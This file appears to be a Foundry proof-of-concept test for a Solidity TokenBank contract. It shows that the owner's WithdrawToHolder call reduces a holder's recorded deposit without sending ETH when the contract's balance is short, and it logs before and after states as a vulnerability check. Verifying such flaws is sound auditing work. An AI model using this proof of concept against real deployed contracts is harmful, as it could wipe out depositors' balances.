// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;
import "forge-std/Test.sol";
import "../src/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol";

contract TokenBank_Test is Test {
    TokenBank bank;
    address owner = address(0x1);
    address holder = address(0x2);

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(holder, 1 ether);
        
        vm.prank(owner);
        bank = new TokenBank();
    }

    function testInsufficientBalanceValidation() public {
        // Make a deposit from holder
        vm.prank(holder);
        bank.Deposit{value: 1 ether}();
        
        assertEq(address(bank).balance, 1 ether, "Contract should have 1 ether");

        // Reduce contract balance to 0.5 ether
        vm.deal(address(bank), 0.5 ether);
        
        // Record holder balance before withdrawal attempt
        uint256 holderBalanceBefore = address(holder).balance;

        // --- Differential Before State Check ---
        console2.log("--- BEFORE-Trigger WithdrawToHolder ---");
        uint256 contractBalanceBefore = address(bank).balance;
        uint256 holderDepositBefore = bank.Holders(holder);
        console2.log("Contract ETH Balance: %d", contractBalanceBefore);
        console2.log("Holder deposit amount: %d", holderDepositBefore);

        // --- Critical Attacker Action ---
        console2.log("--- Trigger WithdrawToHolder ---");
        vm.prank(owner);
        // Should NOT revert despite insufficient balance
        bank.WithdrawToHolder(holder, 1 ether);
        
        // --- Differential After State Check ---
        console2.log("--- AFTER-Trigger WithdrawToHolder ---");
        uint256 contractBalanceAfter = address(bank).balance;
        uint256 holderDepositAfter = bank.Holders(holder);
        uint256 holderBalanceAfter = address(holder).balance;
        console2.log("Contract ETH Balance: %d", contractBalanceAfter);
        console2.log("Holder deposit amount: %d", holderDepositAfter);
        
        // Verify holder didn't receive ETH (existing assertion)
        assertEq(
            holderBalanceAfter, 
            holderBalanceBefore, 
            "Holder should not receive ETH due to insufficient contract balance"
        );

        // --- Differential Vulnerability Analysis ---
        bool depositReducedWithoutTransfer = (holderDepositBefore > holderDepositAfter) && 
                                            (contractBalanceBefore == contractBalanceAfter) &&
                                            (holderBalanceAfter == holderBalanceBefore);
        bool depositReductionExact = (holderDepositBefore - holderDepositAfter) == 1 ether;
        
        if (depositReducedWithoutTransfer && depositReductionExact) {
            console2.log("Vulnerability Exists: Holder deposit reduced by 1 ether without ETH transfer");
        } else if (depositReducedWithoutTransfer) {
            console2.log("Vulnerability Exists: Partial deposit reduction (%d wei) without ETH transfer", 
                        holderDepositBefore - holderDepositAfter);
        } else {
            console2.log("Vulnerability not Exist: Deposit either unchanged or ETH transfer occurred");
        }
    }
}